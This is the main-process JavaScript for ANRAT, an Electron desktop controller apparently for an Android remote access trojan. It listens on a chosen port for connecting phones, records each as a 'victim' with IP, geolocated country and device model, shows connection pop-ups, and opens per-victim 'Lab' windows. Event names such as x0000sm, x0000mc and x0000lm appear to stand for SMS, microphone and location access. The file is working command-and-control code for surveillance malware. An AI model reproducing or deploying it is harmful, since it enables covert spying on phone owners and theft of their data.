const { app, BrowserWindow } = require('electron')
const electron = require('electron');
const { ipcMain } = require('electron');
var io = require('socket.io');
var geoip = require('geoip-lite');
var victimsList = require('./app/assets/js/model/Victim');
module.exports = victimsList;

const path = require('path');
const os = require('os');

//--------------------------------------------------------------
let win;
let display;
var windows = {};
const IOs = {};
//--------------------------------------------------------------

// Detect OS
const isLinux = process.platform === 'linux';
const isWindows = process.platform === 'win32';
const isMac = process.platform === 'darwin';

function createWindow() {
  // get Display Sizes ( x , y , width , height)
  display = electron.screen.getPrimaryDisplay();

  //------------------------SPLASH SCREEN INIT------------------------------------
  // create the splash window
  let splashWin = new BrowserWindow({
    width: 700,
    height: 500,
    frame: false,
    transparent: !isLinux, // Linux has issues with transparency
    icon: path.join(__dirname, 'app/assets/img/icon.png'),
    type: "splash",
    alwaysOnTop: true,
    show: false,
    center: true,
    resizable: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
      // Fix for Linux GPU issues
      ...(isLinux && {
        backgroundThrottling: false
      })
    }
  });

  // load splash file
  splashWin.loadFile(path.join(__dirname, 'app/splash.html'));

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show();
  });

  // Emitted when the window is closed.
  splashWin.on('closed', () => {
    splashWin = null
  })

  //------------------------Main SCREEN INIT------------------------------------
  // Create the browser window.
  win = new BrowserWindow({
    icon: path.join(__dirname, 'app/assets/img/icon.png'),
    width: 1200,
    height: 800,
    minWidth: 900,
    minHeight: 600,
    show: false,
    resizable: true,
    center: true,
    frame: isLinux, // Show native frame on Linux for better compatibility
    transparent: !isLinux, // Disable transparency on Linux
    backgroundColor: isLinux ? '#0c094f' : undefined,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
      // Linux specific fixes
      ...(isLinux && {
        backgroundThrottling: false,
        disableHardwareAcceleration: false
      })
    }
  });

  // Linux: Set window title
  if (isLinux) {
    win.setTitle('ANRAT - Android Remote Administration Tool');
  }

  win.loadFile(path.join(__dirname, 'app/index.html'));

  // Open dev tools for debugging (comment out in production)
  // win.webContents.openDevTools()

  // Emitted when the window is closed.
  win.on('closed', () => {
    win = null
  })

  // Emitted when the window is finished loading.
  win.webContents.on('did-finish-load', function () {
    setTimeout(() => {
      if (splashWin) {
        splashWin.close();
      }
      win.show();
    }, 2000);
  });

  // Linux: Fix for window dragging with custom titlebar
  if (isLinux) {
    win.on('maximize', () => {
      win.webContents.send('window-maximized');
    });
    win.on('unmaximize', () => {
      win.webContents.send('window-unmaximized');
    });
  }
}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
app.on('ready', () => {
  // Linux: Disable hardware acceleration if needed
  if (isLinux) {
    // Uncomment if you have GPU issues
    // app.disableHardwareAcceleration();
  }
  
  createWindow();
});

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  if (win === null) {
    createWindow()
  }
})

// Handle uncaught exceptions
process.on('uncaughtException', function (error) {
  console.error('Uncaught Exception:', error);
  if (error.code == "EADDRINUSE") {
    if (win) {
      win.webContents.send('SocketIO:ListenError', "Address Already in Use");
    }
  } else {
    electron.dialog.showErrorBox("ERROR", JSON.stringify(error));
  }
});

const listeningStatus = {};

ipcMain.on('SocketIO:Listen', function (event, port) {
  if (listeningStatus[port]) {
    event.reply('SocketIO:ListenError', '[x] Already Listening on Port ' + port);
    return;
  }

  try {
    IOs[port] = io.listen(port, {
      maxHttpBufferSize: 1024 * 1024 * 100,
      cors: {
        origin: "*",
        methods: ["GET", "POST"]
      }
    });
    
    IOs[port].sockets.pingInterval = 10000;
    IOs[port].sockets.pingTimeout = 10000;

    IOs[port].sockets.on('connection', function (socket) {
      var address = socket.request.connection;
      var query = socket.handshake.query;
      var index = query.id;
      var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
      var country = null;
      var geo = geoip.lookup(ip);
      if (geo)
        country = geo.country.toLowerCase();

      // Add the victim to victimList
      victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);

      //------------------------Notification SCREEN INIT------------------------------------
      let notification = new BrowserWindow({
        frame: false,
        x: display.bounds.width - 280,
        y: display.bounds.height - 78,
        show: false,
        width: 280,
        height: 78,
        resizable: false,
        skipTaskbar: true,
        alwaysOnTop: true,
        webPreferences: {
          nodeIntegration: true,
          enableRemoteModule: true,
          contextIsolation: false
        }
      });

      notification.webContents.on('did-finish-load', function () {
        notification.show();
        setTimeout(function () {
          notification.destroy()
        }, 3000);
      });

      notification.webContents.victim = victimsList.getVictim(index);
      notification.loadFile(path.join(__dirname, 'app/notification.html'));

      // Notify renderer process
      win.webContents.send('SocketIO:NewVictim', index);

      socket.on('disconnect', function () {
        victimsList.rmVictim(index);
        win.webContents.send('SocketIO:RemoveVictim', index);

        if (windows[index]) {
          BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
          delete windows[index]
        }
      });
    });

    event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port);
    listeningStatus[port] = true;
    
  } catch (error) {
    console.error('Listen Error:', error);
    event.reply('SocketIO:ListenError', '[x] Error: ' + error.message);
  }
});

ipcMain.on('SocketIO:Stop', function (event, port) {
  if (IOs[port]) {
    IOs[port].close();
    IOs[port] = null;
    event.reply('SocketIO:Stop', '[✓] Stopped listening on Port: ' + port);
    listeningStatus[port] = false;
  } else {
    event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening on Port: ' + port);
  }
});

// Fired when Victim's Lab is opened
ipcMain.on('openLabWindow', function (e, page, index) {
  let child = new BrowserWindow({
    icon: path.join(__dirname, 'app/assets/img/icon.png'),
    parent: win,
    width: 900,
    height: 800,
    minWidth: 800,
    minHeight: 600,
    show: false,
    frame: isLinux, // Show native frame on Linux
    transparent: !isLinux,
    backgroundColor: isLinux ? '#0c094f' : undefined,
    resizable: true,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
      ...(isLinux && {
        backgroundThrottling: false
      })
    }
  })

  // Linux: Set window title
  if (isLinux) {
    const victim = victimsList.getVictim(index);
    if (victim) {
      child.setTitle(`ANRAT Lab - ${victim.model}`);
    }
  }

  windows[index] = child.id;
  child.webContents.victim = victimsList.getVictim(index).socket;
  child.loadFile(path.join(__dirname, 'app', page));

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    if (victimsList.getVictim(index) && victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners("x0000ca");
      victimsList.getVictim(index).socket.removeAllListeners("x0000fm");
      victimsList.getVictim(index).socket.removeAllListeners("x0000sm");
      victimsList.getVictim(index).socket.removeAllListeners("x0000cl");
      victimsList.getVictim(index).socket.removeAllListeners("x0000cn");
      victimsList.getVictim(index).socket.removeAllListeners("x0000mc");
      victimsList.getVictim(index).socket.removeAllListeners("x0000lm");
    }
  })
});